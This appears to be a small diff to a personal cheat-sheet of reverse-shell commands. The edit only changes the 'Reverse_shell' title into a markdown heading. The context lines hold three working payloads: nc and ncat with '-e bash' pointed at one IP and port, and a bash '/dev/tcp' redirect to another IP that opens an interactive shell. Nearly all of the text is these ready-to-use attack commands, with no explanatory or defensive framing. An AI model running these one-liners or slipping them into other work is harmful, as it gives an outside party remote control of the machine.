@@ -1,4 +1,4 @@
-Reverse_shell ✅
+# Reverse_shell ✅
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
